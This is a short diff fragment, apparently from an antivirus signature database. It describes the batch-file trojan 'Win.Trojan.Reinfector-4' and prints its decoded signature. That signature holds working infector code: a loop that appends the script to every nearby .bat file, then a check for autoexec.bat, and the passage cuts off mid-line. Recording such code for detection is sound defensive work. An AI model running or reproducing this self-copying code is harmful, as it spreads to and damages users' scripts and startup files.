@@ -1,0 +1,9 @@
+VIRUS NAME: Win.Trojan.Reinfector-4
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+
+:infect
+for %%i in (*.bat ../*.bat) do copy %%i+%0 %%i>nul
+if exist c:\autoexec.bat goto infect2
+if n
